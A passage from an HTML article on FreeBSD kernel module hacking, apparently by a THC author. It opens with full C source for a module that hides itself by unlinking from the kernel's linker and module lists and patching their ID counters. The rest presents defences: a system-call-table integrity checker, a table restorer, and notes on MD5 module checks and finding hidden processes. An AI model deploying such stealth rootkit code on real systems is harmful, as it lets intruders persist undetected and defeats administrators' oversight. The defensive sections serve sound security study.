+I also implemented module hiding perhaps there is a place in the kernel we
+need it. So let's take a look at my implementation :
+
+<xmp>
+/*FEATURES :
+  - manipulate linker files list
+  - manipulate moodules list
+  - manipulate first linker file entry
+  - manipulate global linker file ID coutner
+  - manipulate global modules ID counter
+*/
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <sys/lock.h>
+
+
+typedef TAILQ_HEAD(, module) modulelist_t;
+
+
+extern struct lock lock;
+/*we have to patch the files list*/
+extern linker_file_list_t files;
+extern int next_file_id;
+/*we have to patch the modules list*/
+extern modulelist_t modules;
+extern  int nextid;
+
+
+struct module {
+ TAILQ_ENTRY(module) link;
+ TAILQ_ENTRY(module) flink;
+ struct linker_file *file;
+ int refs;
+ int id;
+ char *name;
+ modeventhand_t handler;
+ void *arg;
+ modspecific_t data;
+};
+
+char string[]="Hello Word";
+
+/*this is just to show that extern functions also work*/
+static
+void do_a_print()
+{
+ printf("IT WORKS : %s\n", string);
+}
+
+/*The syscall *TODO* function*/
+/*This function is not necessary, because we just want to hide a module. We
+only need it for checking, that our module is still working.*/
+static int
+hello (struct proc *p, void *arg)
+{
+ printf ("SYSCALL was ESTABLISHED and is still in memory \n");
+
+ do_a_print();
+ return 0;
+}
+
+/*
+ * The `sysent' for the new syscall
+ */
+static struct sysent hello_sysent = {
+	0,			/* sy_narg */
+	hello			/* sy_call */
+};
+
+/*
+ * The offset in sysent where the syscall is allocated.
+ */
+/*NO_SYSCALL stands for 'let the kernel choose the syscall number'*/
+static int offset = 210;
+
+/*
+ * The function called at load/unload.
+ */
+static int
+load (struct module *module, int cmd, void *arg)
+
+{
+ linker_file_t lf=0;
+
+ module_t mod=0;
+
+
+ lockmgr(&lock, LK_SHARED, 0, curproc);
+
+ /*NOTE : The first linker file is the current kernel image (/kernel for
+          example). If we load our module we will increase the reference cound
+          of the kernel link file, this might be a bit suspect, so we must
+          patch this.*/
+
+  (&files)->tqh_first->refs--;
+  for (lf=(&files)->tqh_first; lf; lf=(lf)->link.tqe_next) {
+
+  if (!strcmp(lf->filename, "hide.ko"))
+  {
+   /*first let's decrement the global link file counter*/
+   next_file_id--;
+   /*now let's remove the entry*/
+   if (((lf)->link.tqe_next)!=NULL)
+
+     (lf)->link.tqe_next->link.tqe_prev=(lf)->link.tqe_prev;
+    else
+     (&files)->tqh_last=(lf)->link.tqe_prev;
+    *(lf)->link.tqe_prev=(lf)->link.tqe_next;
+ 
+   break;    
+  } 
+ }
+ lockmgr(&lock, LK_RELEASE, 0, curproc);
+
+ for (mod=TAILQ_FIRST(&modules); mod; mod=TAILQ_NEXT(mod, link)) {
+  if(!strcmp(mod->name, "mysys"))
+  {
+   /*first let's patch the internal ID counter*/
+    nextid--;
+
+   TAILQ_REMOVE(&modules, mod, link);
+  }
+ }
+ return 0;
+}
+
+/*start everything*/
+/*This function only sets the field of X_module_data, where X stands for the
+kind of module; here SYSCALL_...*/
+SYSCALL_MODULE(mysys, &offset, &hello_sysent, load, NULL);
+</xmp> 
+Load this module via kldload and wonder ;). You won't see anything. Even
+loading another module will seem totally normal, because the ID field is only
+incremented by 1 due to our modifications. After adding this hiding feature
+any module is also unremovable and neary undetectable.
+
+<p>
+<H3><A NAME="II.7."></A>7. Last Words</h3>
+<p>
+As I said in my introduction this part only showed those hacks that
+needed a total re-implementation on BSD compared to the Linux ones. Every other
+hack I presented in my Linux text, should also work; but it's too trivial to
+explain this here.<br>
+Of course, it's also possible to write some kind of FreeBSD virus. Perhaps I
+will work on this, but it's quite easy.
+
+<p>
+<H3><A NAME="III."></A>III. Securing the kernel</h3>
+<p>
+This part will only show you how to avoid some problems (not all) you as
+administrator could have with 'hacker' modules playing havoc with your system
+call table. My Linux text showed many ways how to fight against hostile modules
+with the help of some protection LKMs. I won't repeat those ideas. You can use
+all those modules on FreeBSD too, you only have to change the code a bit. This
+is why this part is quite short; I only describe some new ideas.
+
+<p>
+<H3><A NAME="III.1."></A>1. How to detect sysent[] modifications</h3>
+<p>
+Those of you common with kernel hacking know that nearly every module that
+does something useful for a hacker must modify the kernel system call table.
+[Note : As I said in my introduction there are lots of ways to attack FreeBSD
+without patching the system call table, but ... wait for a further release of
+this text :)]  Those changes are needed to intercept and manipulate system
+calls. Of course there may also be some non-hacking modules that will change
+the global system call table (add a system call or so), but normally those
+driver modules (for example) don't change existing system calls. So we should
+implement some piece of code checking every system call entry on a system that
+is defined during startup for suspicious changes.
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <sys/lock.h>
+
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ char error[400];
+ int counter;
+
+ bzero(&error, sizeof(error)); 
+
+ /*this is hard cut & paste coding :-)*/
+ if (sysent[SYS_exit].sy_call!=exit) error[SYS_exit]=1;
+ if (sysent[SYS_fork].sy_call!=fork) error[SYS_fork]=1;
+ if (sysent[SYS_read].sy_call!=read) error[SYS_read]=1;
+ if (sysent[SYS_write].sy_call!=write) error[SYS_write]=1;
+ if (sysent[SYS_open].sy_call!=open) error[SYS_open]=1;
+ if (sysent[SYS_close].sy_call!=close) error[SYS_close]=1;
+ if (sysent[SYS_wait4].sy_call!=wait4) error[SYS_wait4]=1;
+ if (sysent[SYS_link].sy_call!=link) error[SYS_link]=1;
+ if (sysent[SYS_unlink].sy_call!=unlink) error[SYS_unlink]=1;
+ if (sysent[SYS_chdir].sy_call!=chdir) error[SYS_chdir]=1; 
+ if (sysent[SYS_fchdir].sy_call!=fchdir) error[SYS_fchdir]=1;
+ if (sysent[SYS_mknod].sy_call!=mknod) error[SYS_mknod]=1;
+ if (sysent[SYS_chmod].sy_call!=chmod) error[SYS_chmod]=1;
+ if (sysent[SYS_chown].sy_call!=chown) error[SYS_chown]=1;
+ if (sysent[SYS_break].sy_call!=obreak) error[SYS_break]=1;
+ if (sysent[SYS_getfsstat].sy_call!=getfsstat) error[SYS_getfsstat]=1;
+ if (sysent[SYS_lseek].sy_call!=lseek) error[SYS_lseek]=1;
+ if (sysent[SYS_getpid].sy_call!=getpid) error[SYS_getpid]=1;
+ if (sysent[SYS_mount].sy_call!=mount) error[SYS_mount]=1;
+ if (sysent[SYS_unmount].sy_call!=unmount) error[SYS_unmount]=1;
+ if (sysent[SYS_setuid].sy_call!=setuid) error[SYS_setuid]=1; 
+ if (sysent[SYS_getuid].sy_call!=getuid) error[SYS_getuid]=1;
+ if (sysent[SYS_geteuid].sy_call!=geteuid) error[SYS_geteuid]=1;
+ if (sysent[SYS_ptrace].sy_call!=ptrace) error[SYS_ptrace]=1;
+ if (sysent[SYS_recvmsg].sy_call!=recvmsg) error[SYS_recvmsg]=1;
+ if (sysent[SYS_sendmsg].sy_call!=sendmsg) error[SYS_sendmsg]=1;
+ if (sysent[SYS_recvfrom].sy_call!=recvfrom) error[SYS_recvfrom]=1;
+ if (sysent[SYS_accept].sy_call!=accept) error[SYS_accept]=1;
+ if (sysent[SYS_getpeername].sy_call!=getpeername) error[SYS_getpeername]=1;
+ if (sysent[SYS_getsockname].sy_call!=getsockname) error[SYS_getsockname]=1;
+ if (sysent[SYS_access].sy_call!=access) error[SYS_access]=1;
+ if (sysent[SYS_chflags].sy_call!=chflags) error[SYS_chflags]=1; 
+ if (sysent[SYS_fchflags].sy_call!=fchflags) error[SYS_fchflags]=1;
+ if (sysent[SYS_sync].sy_call!=sync) error[SYS_sync]=1;
+ if (sysent[SYS_kill].sy_call!=kill) error[SYS_kill]=1;
+ if (sysent[SYS_stat].sy_call!=stat) error[SYS_stat]=1;
+ if (sysent[SYS_lstat].sy_call!=lstat) error[SYS_lstat]=1;
+ if (sysent[SYS_dup].sy_call!=dup) error[SYS_dup]=1;
+ if (sysent[SYS_pipe].sy_call!=pipe) error[SYS_pipe]=1;
+ if (sysent[SYS_getegid].sy_call!=getegid) error[SYS_getegid]=1;
+ if (sysent[SYS_profil].sy_call!=profil) error[SYS_profil]=1;
+ if (sysent[SYS_ktrace].sy_call!=ktrace) error[SYS_ktrace]=1;
+ if (sysent[SYS_sigaction].sy_call!=sigaction) error[SYS_sigaction]=1; 
+ if (sysent[SYS_getgid].sy_call!=getgid) error[SYS_getgid]=1;
+ if (sysent[SYS_sigprocmask].sy_call!=sigprocmask) error[SYS_sigprocmask]=1;
+ if (sysent[SYS_getlogin].sy_call!=getlogin) error[SYS_getlogin]=1;
+ if (sysent[SYS_setlogin].sy_call!=setlogin) error[SYS_setlogin]=1;
+ if (sysent[SYS_acct].sy_call!=acct) error[SYS_acct]=1;
+ if (sysent[SYS_sigpending].sy_call!=sigpending) error[SYS_sigpending]=1;
+ if (sysent[SYS_sigaltstack].sy_call!=sigaltstack) error[SYS_sigaltstack]=1;
+ if (sysent[SYS_ioctl].sy_call!=ioctl) error[SYS_ioctl]=1;
+ if (sysent[SYS_reboot].sy_call!=reboot) error[SYS_reboot]=1;
+ if (sysent[SYS_revoke].sy_call!=revoke) error[SYS_revoke]=1;
+ if (sysent[SYS_symlink].sy_call!=symlink) error[SYS_symlink]=1; 
+ if (sysent[SYS_readlink].sy_call!=readlink) error[SYS_readlink]=1;
+ if (sysent[SYS_execve].sy_call!=execve) error[SYS_execve]=1;
+ if (sysent[SYS_umask].sy_call!=umask) error[SYS_umask]=1;
+ if (sysent[SYS_chroot].sy_call!=chroot) error[SYS_chroot]=1;
+ if (sysent[SYS_fstat].sy_call!=fstat) error[SYS_fstat]=1;
+ if (sysent[SYS_msync].sy_call!=msync) error[SYS_msync]=1;
+ if (sysent[SYS_vfork].sy_call!=vfork) error[SYS_vfork]=1;
+ if (sysent[SYS_sbrk].sy_call!=sbrk) error[SYS_sbrk]=1;
+ if (sysent[SYS_sstk].sy_call!=sstk) error[SYS_sstk]=1;
+ if (sysent[SYS_vadvise].sy_call!=ovadvise) error[SYS_vadvise]=1;
+ if (sysent[SYS_munmap].sy_call!=munmap) error[SYS_munmap]=1;
+ if (sysent[SYS_mprotect].sy_call!=mprotect) error[SYS_mprotect]=1;
+ if (sysent[SYS_madvise].sy_call!=madvise) error[SYS_madvise]=1;
+ if (sysent[SYS_mincore].sy_call!=mincore) error[SYS_mincore]=1;
+ if (sysent[SYS_getgroups].sy_call!=getgroups) error[SYS_getgroups]=1;
+ if (sysent[SYS_setgroups].sy_call!=setgroups) error[SYS_setgroups]=1;
+ if (sysent[SYS_getpgrp].sy_call!=getpgrp) error[SYS_getpgrp]=1;
+ if (sysent[SYS_setpgid].sy_call!=setpgid) error[SYS_setpgid]=1;
+ if (sysent[SYS_setitimer].sy_call!=setitimer) error[SYS_setitimer]=1;
+ if (sysent[SYS_swapon].sy_call!=swapon) error[SYS_swapon]=1;
+ if (sysent[SYS_getitimer].sy_call!=getitimer) error[SYS_getitimer]=1;
+ if (sysent[SYS_getdtablesize].sy_call!=getdtablesize)
+     error[SYS_getdtablesize]=1;  
+  if (sysent[SYS_dup2].sy_call!=dup2) error[SYS_dup2]=1;
+ if (sysent[SYS_fcntl].sy_call!=fcntl) error[SYS_fcntl]=1;
+ if (sysent[SYS_select].sy_call!=select) error[SYS_select]=1;
+ if (sysent[SYS_fsync].sy_call!=fsync) error[SYS_fsync]=1;
+ if (sysent[SYS_setpriority].sy_call!=setpriority) error[SYS_setpriority]=1;
+ if (sysent[SYS_socket].sy_call!=socket) error[SYS_socket]=1;
+ if (sysent[SYS_connect].sy_call!=connect) error[SYS_connect]=1;
+ if (sysent[SYS_accept].sy_call!=accept) error[SYS_accept]=1;
+ if (sysent[SYS_getpriority].sy_call!=getpriority) error[SYS_getpriority]=1;
+ if (sysent[SYS_sigreturn].sy_call!=sigreturn) error[SYS_sigreturn]=1;
+ if (sysent[SYS_bind].sy_call!=bind) error[SYS_bind]=1;
+ if (sysent[SYS_setsockopt].sy_call!=setsockopt) error[SYS_setsockopt]=1;
+ if (sysent[SYS_listen].sy_call!=listen) error[SYS_listen]=1;
+ if (sysent[SYS_gettimeofday].sy_call!=gettimeofday) error[SYS_gettimeofday]=1;
+ if (sysent[SYS_getrusage].sy_call!=getrusage) error[SYS_getrusage]=1;
+ if (sysent[SYS_getsockopt].sy_call!=getsockopt) error[SYS_getsockopt]=1;
+ if (sysent[SYS_sigreturn].sy_call!=sigreturn) error[SYS_sigreturn]=1;
+ if (sysent[SYS_readv].sy_call!=readv) error[SYS_readv]=1;
+ if (sysent[SYS_writev].sy_call!=writev) error[SYS_writev]=1;
+ if (sysent[SYS_settimeofday].sy_call!=settimeofday) error[SYS_settimeofday]=1;
+ if (sysent[SYS_fchown].sy_call!=fchown) error[SYS_fchown]=1;
+ if (sysent[SYS_fchmod].sy_call!=fchmod) error[SYS_fchmod]=1;
+ if (sysent[SYS_recvfrom].sy_call!=recvfrom) error[SYS_recvfrom]=1;
+ if (sysent[SYS_setreuid].sy_call!=setreuid) error[SYS_setreuid]=1;
+ if (sysent[SYS_setregid].sy_call!=setregid) error[SYS_setregid]=1;
+ if (sysent[SYS_rename].sy_call!=rename) error[SYS_rename]=1; 
+ if (sysent[SYS_truncate].sy_call!=truncate) error[SYS_truncate]=1;
+ if (sysent[SYS_ftruncate].sy_call!=ftruncate) error[SYS_ftruncate]=1;
+ if (sysent[SYS_flock].sy_call!=flock) error[SYS_flock]=1;
+ if (sysent[SYS_mkfifo].sy_call!=mkfifo) error[SYS_mkfifo]=1;
+ if (sysent[SYS_sendto].sy_call!=sendto) error[SYS_sendto]=1;
+ if (sysent[SYS_shutdown].sy_call!=shutdown) error[SYS_shutdown]=1;
+ if (sysent[SYS_socketpair].sy_call!=socketpair) error[SYS_socketpair]=1;
+ if (sysent[SYS_mkdir].sy_call!=mkdir) error[SYS_mkdir]=1;
+ if (sysent[SYS_rmdir].sy_call!=rmdir) error[SYS_rmdir]=1;
+ if (sysent[SYS_utimes].sy_call!=utimes) error[SYS_utimes]=1;
+ if (sysent[SYS_adjtime].sy_call!=adjtime) error[SYS_adjtime]=1;
+ if (sysent[SYS_getpeername].sy_call!=getpeername) error[SYS_getpeername]=1;
+ if (sysent[SYS_getrlimit].sy_call!=getrlimit) error[SYS_getrlimit]=1;
+ if (sysent[SYS_setrlimit].sy_call!=setrlimit) error[SYS_setrlimit]=1;
+ if (sysent[SYS_quotactl].sy_call!=quotactl) error[SYS_quotactl]=1;
+ if (sysent[SYS_statfs].sy_call!=statfs) error[SYS_statfs]=1;
+ if (sysent[SYS_fstatfs].sy_call!=fstatfs) error[SYS_fstatfs]=1;
+ if (sysent[SYS_getdomainname].sy_call!=getdomainname)
+     error[SYS_getdomainname]=1;  
+ if (sysent[SYS_setdomainname].sy_call!=setdomainname)
+     error[SYS_setdomainname]=1;  
+ if (sysent[SYS_uname].sy_call!=uname) error[SYS_uname]=1;  
+ if (sysent[SYS_sysarch].sy_call!=sysarch) error[SYS_sysarch]=1;   
+ if (sysent[SYS_rtprio].sy_call!=rtprio) error[SYS_rtprio]=1;  
+ if (sysent[SYS_semsys].sy_call!=semsys) error[SYS_semsys]=1;  
+ if (sysent[SYS_msgsys].sy_call!=msgsys) error[SYS_msgsys]=1;  
+ if (sysent[SYS_shmsys].sy_call!=shmsys) error[SYS_shmsys]=1;  
+ if (sysent[SYS_setgid].sy_call!=setgid) error[SYS_setgid]=1;  
+ if (sysent[SYS_setegid].sy_call!=setegid) error[SYS_setegid]=1;  
+ if (sysent[SYS_seteuid].sy_call!=seteuid) error[SYS_seteuid]=1;  
+ if (sysent[SYS_stat].sy_call!=stat) error[SYS_stat]=1;  
+ if (sysent[SYS_fstat].sy_call!=fstat) error[SYS_fstat]=1;  
+ if (sysent[SYS_lstat].sy_call!=lstat) error[SYS_lstat]=1;  
+ if (sysent[SYS_pathconf].sy_call!=pathconf) error[SYS_pathconf]=1;  
+ if (sysent[SYS_fpathconf].sy_call!=fpathconf) error[SYS_fpathconf]=1;  
+ if (sysent[SYS_getrlimit].sy_call!=getrlimit) error[SYS_getrlimit]=1;  
+ if (sysent[SYS_setrlimit].sy_call!=setrlimit) error[SYS_setrlimit]=1;  
+ if (sysent[SYS_getdirentries].sy_call!=getdirentries) 
+    error[SYS_getdirentries]=1; 
+ if (sysent[SYS_mmap].sy_call!=mmap) error[SYS_mmap]=1;  
+ if (sysent[SYS_lseek].sy_call!=lseek) error[SYS_lseek]=1;  
+ if (sysent[SYS_truncate].sy_call!=truncate) error[SYS_truncate]=1;  
+ if (sysent[SYS_ftruncate].sy_call!=ftruncate) error[SYS_ftruncate]=1;  
+ if (sysent[SYS___sysctl].sy_call!=__sysctl) error[SYS___sysctl]=1;  
+ if (sysent[SYS_mlock].sy_call!=mlock) error[SYS_mlock]=1;  
+ if (sysent[SYS_munlock].sy_call!=munlock) error[SYS_munlock]=1;  
+ if (sysent[SYS_undelete].sy_call!=undelete) error[SYS_undelete]=1;  
+ if (sysent[SYS_futimes].sy_call!=futimes) error[SYS_futimes]=1;  
+ if (sysent[SYS_getpgid].sy_call!=getpgid) error[SYS_getpgid]=1;  
+ if (sysent[SYS_poll].sy_call!=poll) error[SYS_poll]=1;  
+ if (sysent[SYS___semctl].sy_call!=__semctl) error[SYS___semctl]=1;  
+ if (sysent[SYS_semget].sy_call!=semget) error[SYS_semget]=1;  
+ if (sysent[SYS_semop].sy_call!=semop) error[SYS_semop]=1;  
+ if (sysent[SYS_semconfig].sy_call!=semconfig) error[SYS_semconfig]=1;  
+ if (sysent[SYS_msgctl].sy_call!=msgctl) error[SYS_msgctl]=1;  
+ if (sysent[SYS_msgsnd].sy_call!=msgsnd) error[SYS_msgsnd]=1; 
+ if (sysent[SYS_msgrcv].sy_call!=msgrcv) error[SYS_msgrcv]=1;  
+ if (sysent[SYS_shmat].sy_call!=shmat) error[SYS_shmat]=1;  
+ if (sysent[SYS_shmctl].sy_call!=shmctl) error[SYS_shmctl]=1;  
+ if (sysent[SYS_shmdt].sy_call!=shmdt) error[SYS_shmdt]=1;  
+ if (sysent[SYS_shmget].sy_call!=shmget) error[SYS_shmget]=1;  
+ if (sysent[SYS_clock_gettime].sy_call!=clock_gettime) 
+     error[SYS_clock_gettime]=1; 
+ if (sysent[SYS_clock_settime].sy_call!=clock_settime) 
+    error[SYS_clock_settime]=1;
+ if (sysent[SYS_clock_getres].sy_call!=clock_getres) 
+    error[SYS_clock_getres]=1; 
+ if (sysent[SYS_nanosleep].sy_call!=nanosleep) error[SYS_nanosleep]=1;  
+ if (sysent[SYS_minherit].sy_call!=minherit) error[SYS_minherit]=1;  
+ if (sysent[SYS_rfork].sy_call!=rfork) error[SYS_rfork]=1;  
+ if (sysent[SYS_openbsd_poll].sy_call!=openbsd_poll) 
+    error[SYS_openbsd_poll]=1;  
+ if (sysent[SYS_issetugid].sy_call!=issetugid) 
+   error[SYS_issetugid]=1;  
+ if (sysent[SYS_lchown].sy_call!=lchown) error[SYS_lchown]=1;  
+ if (sysent[SYS_getdents].sy_call!=getdents) error[SYS_getdents]=1; 
+ if (sysent[SYS_lchmod].sy_call!=lchmod) error[SYS_lchmod]=1;
+ if (sysent[SYS_lutimes].sy_call!=lutimes) error[SYS_lutimes]=1;
+ if (sysent[SYS_modnext].sy_call!=modnext) error[SYS_modnext]=1;
+ if (sysent[SYS_modstat].sy_call!=modstat) error[SYS_modstat]=1;
+ if (sysent[SYS_modfnext].sy_call!=modfnext) error[SYS_modfnext]=1;
+ if (sysent[SYS_modfind].sy_call!=modfind) error[SYS_modfind]=1;
+ if (sysent[SYS_kldload].sy_call!=kldload) error[SYS_kldload]=1;
+ if (sysent[SYS_kldunload].sy_call!=kldunload) error[SYS_kldunload]=1;
+ if (sysent[SYS_kldfind].sy_call!=kldfind) error[SYS_kldfind]=1;
+ if (sysent[SYS_kldnext].sy_call!=kldnext) error[SYS_kldnext]=1;
+ if (sysent[SYS_kldstat].sy_call!=kldstat) error[SYS_kldstat]=1;
+ if (sysent[SYS_kldfirstmod].sy_call!=kldfirstmod) error[SYS_kldfirstmod]=1;
+ if (sysent[SYS_getsid].sy_call!=getsid) error[SYS_getsid]=1;
+ if (sysent[SYS_aio_return].sy_call!=aio_return) error[SYS_aio_return]=1;
+ if (sysent[SYS_aio_suspend].sy_call!=aio_suspend) error[SYS_aio_suspend]=1;
+ if (sysent[SYS_aio_cancel].sy_call!=aio_cancel) error[SYS_aio_cancel]=1;
+ if (sysent[SYS_aio_error].sy_call!=aio_error) error[SYS_aio_error]=1;
+ if (sysent[SYS_aio_read].sy_call!=aio_read) error[SYS_aio_read]=1;
+ if (sysent[SYS_aio_write].sy_call!=aio_write) error[SYS_aio_write]=1;
+ if (sysent[SYS_lio_listio].sy_call!=lio_listio) error[SYS_lio_listio]=1;
+ if (sysent[SYS_yield].sy_call!=yield) error[SYS_yield]=1;
+ if (sysent[SYS_thr_sleep].sy_call!=thr_sleep) error[SYS_thr_sleep]=1;
+ if (sysent[SYS_thr_wakeup].sy_call!=thr_wakeup) error[SYS_thr_wakeup]=1;
+ if (sysent[SYS_mlockall].sy_call!=mlockall) error[SYS_mlockall]=1;
+ if (sysent[SYS_munlockall].sy_call!=munlockall) error[SYS_munlockall]=1;
+ if (sysent[SYS___getcwd].sy_call!=__getcwd) error[SYS___getcwd]=1;
+ if (sysent[SYS_sched_setparam].sy_call!=sched_setparam)
+     error[SYS_sched_setparam]=1;
+ if (sysent[SYS_sched_getparam].sy_call!=sched_getparam)
+     error[SYS_sched_getparam]=1;
+ if (sysent[SYS_sched_setscheduler].sy_call!=sched_setscheduler)
+     error[SYS_sched_setscheduler]=1;
+ if (sysent[SYS_sched_getscheduler].sy_call!=sched_getscheduler)
+     error[SYS_sched_getscheduler]=1;
+ if (sysent[SYS_sched_yield].sy_call!=sched_yield)
+     error[SYS_sched_yield]=1;
+ if (sysent[SYS_sched_get_priority_max].sy_call!=sched_get_priority_max)
+     error[SYS_sched_get_priority_max]=1;
+ if (sysent[SYS_sched_get_priority_min].sy_call!=sched_get_priority_min)
+     error[SYS_sched_get_priority_min]=1;
+ if (sysent[SYS_sched_rr_get_interval].sy_call!=sched_rr_get_interval)
+     error[SYS_sched_rr_get_interval]=1;
+ if (sysent[SYS_utrace].sy_call!=utrace)
+     error[SYS_utrace]=1;
+ if (sysent[SYS_sendfile].sy_call!=sendfile)
+     error[SYS_sendfile]=1;
+ if (sysent[SYS_kldsym].sy_call!=kldsym)
+     error[SYS_kldsym]=1;
+ printf("RESULTS : Modified System Calls \n\n");
+ printf("number   new-addr\n");
+ printf("------   --------\n");
+ for (counter=0; counter <=399; counter++)
+ if (error[counter]==1)
+  printf("%d       %p\n", counter, sysent[counter].sy_call);
+ return 0;
+}
+                                                   
+        
+static moduledata_t syscall_mod = {
+ "SysentChecker", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>  
+Nice code, isn't it :). Well I did not have the time, to write a nice wrapper.
+So this is just the plain idea filled in a module. <br>
+The idea : Every system call entry (sysent) has a function member (sy_call) as
+you know. In order to modify or intercept a system call a hacker has to change
+this address pointing to his own function. So we only have to check these
+addreesses against the system functions (like write for the SYS_write system
+call) to check the system.<br>
+Average hackers will be stopped with this way of checking system
+integrity, gurus won't (you can insert code without changing the system call
+table, I'm working on this at the moment -> look for further releases).
+
+<p>
+<H3><A NAME="III.2."></A>2. How to restore old system calls</h3>
+<p>    
+After detecting a changed system call table it is a good idea to restore the
+original one. <br>
+I dont't present you the best solution : Start a module on system startup,
+copy all sysent fields into another sysent array. If you want to restore every
+sysent just copy the saved list to the modified sysent list.
+
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <sys/lock.h>
+
+#define MAX_SYSCALL_NUM 337
+
+struct sysent save_sysent[MAX_SYSCALL_NUM];
+
+void restoresys(struct proc *p)
+{
+ int counter;
+ printf("RESTORE\n");
+ for (counter=0; counter<=MAX_SYSCALL_NUM; counter++)
+  sysent[counter]=save_sysent[counter];
+}
+
+
+static struct sysent restoresys_sysent = {
+ 0,
+ restoresys
+};
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int counter;
+ if (cmd==MOD_LOAD)
+ { for (counter=0; counter<=MAX_SYSCALL_NUM; counter++)
+   save_sysent[counter]=sysent[counter];
+  sysent[210]=restoresys_sysent;
+ }
+ return 0;
+}
+                                                   
+         
+static moduledata_t syscall_mod = {
+ "SysentRestore", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>
+
+This module should be loaded at system startup (the best would be loading it
+before the first connect to the 'hostile' net). Of course, you should add
+hiding features to this module. This will also prevent hackers from easily
+manipulate your own sysent restore list.
+
+<p>
+<H3><A NAME="III.3."></A>3. General ideas for using MD5 Hashes </h3>
+<p>
+Ok the latter two sections explained how to detect and repair the damage any
+hostile module could do, but what about prevention.
+My Linux article used a passworded createmodule() system call. This time
+you could catch kldload() in order to check the module. Note : I'm not sure
+at the moment, but I think catching this system call is not enough, I think
+it's possible to load a module without the kldstuff; just an idea.<br>
+This time we could use a MD5 hash (digest). The function (macros) we need are
+explained in the MD5 man page (section 9). Take a look at those function and
+you'll recognize how easy it is to implement. These macros help us to get a
+digest on a module someone wants to load on our system. You only have to hard
+code some hashes into your kernel for checking the loaded ones. The rest
+should be clear.
+
+<p>
+<H3><A NAME="III.4."></A>4. How to see a hidden process</h3>
+<p>
+As I said in part I of this paper every process is saved in the allproc
+list which consists of lots of proc structure each holding one process running
+on the system. I also said that it's impossible to delete a process from thist
+list (scheduling, timing, etc.) so we patched the sysctl system call to hide a
+certain process. <br>
+This means that we could write some kernel code (module) which will print the
+whole allproc list including the process to hide. The code for this module
+was already shown in I.7.1.
+
+<p>
+<H3><A NAME="III.5."></A>5. Last words</h3>
+<p>
+Every idea mentioned in this part will stop most (!!) attacks on your system
+via kernel modules. Of course, you have to handle things like reboots etc. for
+making everything a bit more secure.<br>
+BUT any person who really knows the kernel and the system will easily work
+around those protections schemes... Bear in mind : It's always harder to
+secure a system than to hack it.
+
+<p>
+<H3><A NAME="IV."></A>IV. Last things to mention</h3>
+<p>
+<p>
+<H3><A NAME="IV.1."></A>1. What about OpenBSD and NetBSD</h3>
+<p>
+
+At the moment I have no running OpenBSD or NetBSD system, but I took a very
+brief look at the OpenBSD kernel. It uses the LKM scheme FreeBSD also used in
+former releases. The rest of the kernel is very similar to FreeBSD, so I think
+there should be no big problems porting the modules in this text to OpenBSD or
+NetBSD. THC will work on this, but I really can't tell when we are finished...
+
+<p>
+<H3><A NAME="IV.2."></A>2. Resources</h3>
+<p>
+<p>
+<b>[Internet]</b>
+<p>
+http://www.freebsd.org : everything you need<br>
+http://www.thc.org   : THC Homepage (Linux LKM article and lots of more!)<br>
+<p>
+<p>
+<b>[books]</b>
+<p>
+'The Design and Implementation of the 4.4BSD Operating System' (Addison
+Wesley) : One of the best books I know, a bit old but still useful.
+
+<p>
+<H3><A NAME="IV.3."></A>3. Greetings</h3>
+<p>
+<i>groups</i> :<br>
+<b>THC, ADM, ech0, deep, CCC</b><br>
+<p>
+<i>personal</i> : <br>
+<b>van Hauser</b><br>
+-> thanks for the idea to write this article; and for answering lots of
+questions :)<br>
+<b>Stealth</b><br>
+-> I got your mails :) ext2 fs text is really nice<br> 
+<b>mindmaniac</b><br> 
+-> again a big thanks for starting the whole thing...<br> 
+<b>Solar Designer</b><br> 
+-> there's only one word for you : *ELITE*. The next release will deal with the
+other kernel stuff, perhaps I'll need some help ;)<br>         
+<b>Aleph1</b><br> 
+-> what would the world be without bugtraq<br> 
+</BODY>
+</HTML>
